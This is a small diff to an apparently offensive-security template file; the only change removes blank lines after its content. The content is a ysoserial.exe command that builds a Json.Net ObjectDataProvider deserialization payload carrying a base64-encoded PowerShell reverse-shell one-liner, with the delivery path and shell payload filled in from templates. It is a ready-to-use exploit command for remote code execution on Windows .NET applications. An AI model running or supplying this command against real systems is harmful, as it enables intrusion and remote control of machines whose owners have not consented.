@@ -7,5 +7,3 @@ metadata:
 
 content: |
   <%=$(esh variables/delivery_path_windows)%>\Release\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "<%=$(esh payloads/revshell-windows-powershell-oneliner-base64encoded)%>" -o <raw|base64>
-
-
